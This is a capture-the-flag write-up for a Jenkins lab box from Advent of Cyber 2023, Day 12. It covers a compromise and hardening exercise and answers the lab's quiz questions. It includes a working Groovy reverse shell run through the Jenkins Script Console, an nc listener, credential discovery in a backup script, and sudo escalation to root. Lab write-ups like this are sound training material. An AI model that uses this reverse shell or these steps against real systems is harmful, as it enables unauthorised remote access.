# AoC 2023 - Day 12

> `Defence in depth` Sleighing Threats, One Layer at a Time

> With the chaos of the recent merger, the company's security landscape has turned into the Wild West. Servers and endpoints, once considered fortresses, now resemble neglected outposts on the frontier, vulnerable to any attacker.

## Learning Objectives
> - Defence in Depth
> - Basic Endpoint Hardening
> - Simple Boot2Root Methodology


## Steps

```bash
└─$ export box=10.10.165.33
└─$ firefox http://$box:8080
```

`Jenkins` web-app is running. Under `Manage Jenkins/ScriptConsole` I can run commands on the box.

#### Setting up a reverse shell
```bash
String host="{my ip}";
int port=6996;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

#### Accepting the connection
```bash
└─$ nc -nvlp 6996
listening on [any] 6996 ...
connect to [10.8.214.49] from (UNKNOWN) [10.10.165.33] 36028
whoami
jenkins
```

There is a backup-script at `/opt/scripts/backup.sh`:
```bash
#!/bin/sh

mkdir /var/lib/jenkins/backup
mkdir /var/lib/jenkins/backup/jobs /var/lib/jenkins/backup/nodes /var/lib/jenkins/backup/plugins /var/lib/jenkins/backup/secrets /var/lib/jenkins/backup/users

cp /var/lib/jenkins/*.xml /var/lib/jenkins/backup/
cp -r /var/lib/jenkins/jobs/ /var/lib/jenkins/backup/jobs/
cp -r /var/lib/jenkins/nodes/ /var/lib/jenkins/backup/nodes/
cp /var/lib/jenkins/plugins/*.jpi /var/lib/jenkins/backup/plugins/
cp /var/lib/jenkins/secrets/* /var/lib/jenkins/backup/secrets/
cp -r /var/lib/jenkins/users/* /var/lib/jenkins/backup/users/

tar czvf /var/lib/jenkins/backup.tar.gz /var/lib/jenkins/backup/
/bin/sleep 5

username="tracy"
password="{REDACTED}"
Ip="localhost"
sshpass -p "$password" scp /var/lib/jenkins/backup.tar.gz $username@$Ip:/home/tracy/backups
/bin/sleep 10

rm -rf /var/lib/jenkins/backup/
rm -rf /var/lib/jenkins/backup.tar.gz
```

#### ssh tracy@box

```bash
└─$ ssh tracy@$box
tracy@10.10.165.33's password:
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-88-generic x86_64)
[...]
```

#### Checking privileges

```bash
tracy@jenkins:~$ sudo -l
[sudo] password for tracy:
Matching Defaults entries for tracy on jenkins:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User tracy may run the following commands on jenkins:
    (ALL : ALL) ALL
```

Basically, `tracy` can do anything.

```bash
tracy@jenkins:~$ sudo su
root@jenkins:/home/tracy#
```

Getting the root flag.

```bash
root@jenkins:/# sudo find / -type f -name "flag.txt"
/root/flag.txt
root@jenkins:/home/admin# cd
root@jenkins:~# ls -la
total 48
drwx------  5 root root  4096 Dec 17 11:40 .
drwxr-xr-x 19 root root  4096 Aug 29 21:23 ..
-rw-------  1 root root     0 Dec 17 11:40 .bash_history
-rw-r--r--  1 root root  3162 Nov 20 00:33 .bashrc
-rw-r--r--  1 root root    17 Nov 20 00:05 flag.txt
-rw-------  1 root root    20 Nov 20 00:18 .lesshst
drwxr-xr-x  3 root root  4096 Aug 30 14:04 .local
-rw-r--r--  1 root root   161 Jul  9  2019 .profile
drwx------  3 root root  4096 Aug 29 21:38 snap
drwx------  2 root root  4096 Nov 15 03:58 .ssh
-rw-r--r--  1 root root     0 Aug 29 23:10 .sudo_as_admin_successful
-rw-------  1 root root 12111 Nov 22 20:01 .viminfo
root@jenkins:~# cat flag.txt
{REDACTED}
```

#### Hardening - removing tracy from sudo group
```bash
root@jenkins:/# sudo deluser tracy sudo
Removing user `tracy' from group `sudo' ...
Done.
root@jenkins:/# sudo -l -U tracy
User tracy is not allowed to run sudo on jenkins.
```

After logging out
```bash
tracy@jenkins:~$ sudo -l
[sudo] password for tracy:
Sorry, user tracy may not run sudo on jenkins.
```

#### Getting the ssh flag

The flag is tucked away inside `sshd_config`.

```bash
admin@jenkins:$ nano /etc/ssh/sshd_config
```

#### Getting the jenkins flag

This one took me some time... it was found inside `config.xml.bak`.

```bash
tracy@jenkins:/var/lib/jenkins$ nano config.xml.bak
```

There are more steps to the entire walk-through, but this is what's needed to answer all the questions.

## Question 1

> What is the default port for Jenkins?

8080

## Question 2

> What is the password of the user tracy?

Found in `/opt/scripts/backup.sh`.

## Question 3

> What's the root flag?

Found in `/flag.txt` with root access.

## Question 4

> What is the error message when you login as tracy again and try sudo -l after its removal from the sudoers group?

`Sorry, user tracy may not run sudo on jenkins.`

## Question 5

> What's the SSH flag?

The flag is tucked away inside `sshd_config`.

## Question 6

> What's the Jenkins flag?

This one took me some time... it was found inside `config.xml.bak`.